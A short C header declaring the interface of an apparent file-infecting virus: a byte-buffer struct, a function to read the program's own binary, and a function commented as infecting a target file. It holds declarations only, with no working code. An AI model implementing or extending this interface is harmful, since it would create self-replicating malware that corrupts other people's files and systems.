#ifndef HEADER_CLONELIB
	#define HEADER_CLONELIB
	#include <stdbool.h>
	
	//Structure contains string and string length
	typedef struct Bytes{
		char* value;
		unsigned int length;
	} Bytes;

	//Gets own binary
	Bytes* getOwnBytes(const char*);

	//Infects a target file
	bool infectTarget(const char*, Bytes*);
#endif